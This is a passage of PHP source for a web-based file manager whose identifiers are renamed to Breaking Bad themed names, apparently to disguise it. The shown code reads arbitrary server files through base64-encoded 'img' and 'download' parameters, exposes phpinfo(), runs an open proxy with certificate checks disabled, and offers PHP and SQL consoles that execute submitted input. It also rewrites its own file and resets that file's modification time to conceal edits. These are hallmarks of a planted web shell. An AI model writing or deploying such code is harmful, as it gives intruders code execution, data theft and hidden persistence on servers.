		} elseif (!empty($_POST[$cartelLanguageTemplate.'_new_name'])) {
			$chemistryPanel = json_encode(json_decode(${$cartelLanguageTemplate.'_templates'},true)+array($_POST[$cartelLanguageTemplate.'_new_name']=>$_POST[$cartelLanguageTemplate.'_new_value']),JSON_HEX_APOS);


		}



		if (!empty($chemistryPanel)) {


			$goodeFileContent = file_get_contents(__FILE__);


			$searchBlue = preg_match('#'.$cartelLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodeFileContent, $methMatches);



			if (!empty($methMatches[1])) {


				$blueFileModified = filemtime(__FILE__);

				$replaceWalter = str_replace('{"'.$methMatches[1].'"}',$chemistryPanel,$goodeFileContent);

				if (file_put_contents(__FILE__, $replaceWalter)) {
					${$cartelLanguageTemplate.'_templates'} = $chemistryPanel;
					$saulMessage .= __('File updated');
				} else $saulMessage .= __('Error occurred');
				if (!empty($labConfig['fm_restore_time'])) touch(__FILE__,$blueFileModified);



			}	
		} else $saulMessage .= __('Error occurred');
	}
}




// Just show image


if (isset($_GET['img'])) {
	$walterFile=base64_decode($_GET['img']);
	if ($fringInfo=getimagesize($walterFile)){


		switch  ($fringInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP



			case 1: $pinkmanExtension='gif'; break;

			case 2: $pinkmanExtension='jpeg'; break;
			case 3: $pinkmanExtension='png'; break;

			case 6: $pinkmanExtension='bmp'; break;


			default: die();



		}


		header("Content-type: image/$pinkmanExtension");
		echo file_get_contents($walterFile);
		die();
	}


}


// Just download file
if (isset($_GET['download'])) {


	$walterFile=base64_decode($_GET['download']);
	downloadBlueFile($walterFile);	

}

// Just show info

if (isset($_GET['phpinfo'])) {

	phpinfo(); 

	die();


}


// Mini proxy, many bugs!



if (isset($_GET['proxy']) && (!empty($labConfig['enable_proxy']))) {
	$labUrl = isset($_GET['url'])?urldecode($_GET['url']):'';


	$proxyHeisenbergForm = '



<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
	<form action="" method="GET">



	<input type="hidden" name="proxy" value="true">

	'.breakingHome().' <a href="'.$labUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$labUrl.'" size="55">



	<input type="submit" value="'.__('Show').'" class="fm_input">


	</form>

</div>
';


	if ($labUrl) {
		$chemistryChannel = curl_init($labUrl);


		curl_setopt($chemistryChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');

		curl_setopt($chemistryChannel, CURLOPT_FOLLOWLOCATION, 1);


		curl_setopt($chemistryChannel, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($chemistryChannel, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($chemistryChannel, CURLOPT_HEADER, 0);
		curl_setopt($chemistryChannel, CURLOPT_REFERER, $labUrl);


		curl_setopt($chemistryChannel, CURLOPT_RETURNTRANSFER,true);


		$breakingResult = curl_exec($chemistryChannel);

		curl_close($chemistryChannel);
		//$breakingResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$labUrl.'/\\2"', $breakingResult);



		$breakingResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'labUrlProxy', $breakingResult);
		$breakingResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.saulHomeStyle().'</style>'.$proxyHeisenbergForm, $breakingResult);
		echo $breakingResult;
		die();
	} 

}
?>
<!doctype html>



<html>

<head>     



	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />


    <title><?=__('File manager')?></title>

<style>

body {
	background-color:	white;

	font-family:		Verdana, Arial, Helvetica, sans-serif;


	font-size:			8pt;



	margin:				0px;
}




a:link, a:active, a:visited { color: #006699; text-decoration: none; }

a:hover { color: #DD6900; text-decoration: underline; }
a.th:link { color: #FFA34F; text-decoration: none; }

a.th:active { color: #FFA34F; text-decoration: none; }



a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }




table.bg {


	background-color: #ACBBC6


}



th, td { 



	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;

	padding: 3px;
}




th	{


	height:				25px;
	background-color:	#006699;


	color:				#FFA34F;



	font-weight:		bold;



	font-size:			11px;
}



.row1 {
	background-color:	#EFEFEF;



}

.row2 {
	background-color:	#DEE3E7;
}



.row3 {
	background-color:	#D1D7DC;
	padding: 5px;


}

tr.row1:hover {
	background-color:	#F3FCFC;



}

tr.row2:hover {
	background-color:	#F0F6F6;
}


.whole {

	width: 100%;

}





.all tbody td:first-child{width:100%;}





textarea {



	font: 9pt 'Courier New', courier;
	line-height: 125%;
	padding: 5px;
}

.textarea_input {
	height: 1em;
}

.textarea_input:focus {
	height: auto;


}

input[type=submit]{



	background: #FCFCFC none !important;


	cursor: pointer;
}

.folder {

    background-image: url("data:image/png;base64,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");
}

.file {
    background-image: url("data:image/png;base64,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");
}
<?=saulHomeStyle()?>

.img {

	background-image: 



url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
}
@media screen and (max-width:720px){

  table{display:block;}
    #fm_table td{display:inline;float:left;}
    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}
    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}
	#header_table table td {display:inline;float:left;}
}


</style>

</head>
<body>

<?php



$includedSaulUrl = '?fm=true';
if (isset($_POST['sqlrun'])&&!empty($labConfig['enable_sql_console'])){
	$heisenbergResult = empty($_POST['sql']) ? '' : $_POST['sql'];
	$cartelResponseLanguage = 'sql';

} elseif (isset($_POST['phprun'])&&!empty($labConfig['enable_php_console'])){
	$heisenbergResult = empty($_POST['php']) ? '' : $_POST['php'];

	$cartelResponseLanguage = 'php';



} 



if (isset($_GET['fm_settings'])) {



	echo ' 
<table class="whole">

<form method="post" action="">
<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>

'.(empty($saulMessage)?'':'<tr><td class="row2" colspan="2">'.$saulMessage.'</td></tr>').'
'.labConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'
'.labConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'


'.labConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'


'.labConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'


'.labConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'
'.labConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'



'.labConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'



'.labConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'
'.labConfigCheckboxRow(__('Show').' xls','show_xls').'
'.labConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'


'.labConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'

<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$labConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$labConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>

<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$labConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$labConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>


'.labConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'



'.labConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'
'.labConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'
'.labConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'



'.labConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'



<tr><td class="row3"><a href="'.getLabUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>



</form>
</table>
<table>
<form method="post" action="">

<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($gusAuthenticated['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
<tr><td class="row1"><input name="fm_login[login]" value="'.$gusAuthenticated['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>


<tr><td class="row1"><input name="fm_login[password]" value="'.$gusAuthenticated['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$gusAuthenticated['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>



<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$gusAuthenticated['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$gusAuthenticated['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>


<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>


</form>
</table>';

echo labTemplateForm('php'),labTemplateForm('sql');

} elseif (isset($proxyHeisenbergForm)) {


	die($proxyHeisenbergForm);


} elseif (isset($cartelResponseLanguage)) {	
?>
<table class="whole">

<tr>
    <th><?=__('File manager').' - '.$blueCrystalPath?></th>
</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($cartelResponseLanguage)?> <?=__('Console')?><?php



	if($cartelResponseLanguage=='sql') echo ' - Database: '.$labConfig['sql_db'].'</h2></td><td>'.runLabInput('php');


	else echo '</h2></td><td>'.runLabInput('sql');

	?></td></tr></table></td>



</tr>

<tr>



    <td class="row1">


		<a href="<?=$includedSaulUrl.'&path=' . $blueCrystalPath;?>"><?=__('Back')?></a>
		<form action="" method="POST" name="console">
		<textarea name="<?=$cartelResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$heisenbergResult?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">


		<input type="submit" value="<?=__('Submit')?>" name="<?=$cartelResponseLanguage?>run">


<?php
$stringTemplateHeisenberg = $cartelResponseLanguage.'_templates';
$chemTemplate = !empty($$stringTemplateHeisenberg) ? json_decode($$stringTemplateHeisenberg,true) : '';
if (!empty($chemTemplate)){



	$blueCrystalActive = isset($_POST[$cartelResponseLanguage.'_tpl']) ? $_POST[$cartelResponseLanguage.'_tpl'] : '';

	$selectLab = '<select name="'.$cartelResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$cartelResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$cartelResponseLanguage.'\'].value =\'\';" >'."\n";

	$selectLab .= '<option value="-1">' . __('Select') . "</option>\n";

	foreach ($chemTemplate as $crystalKey=>$heisenbergValue){


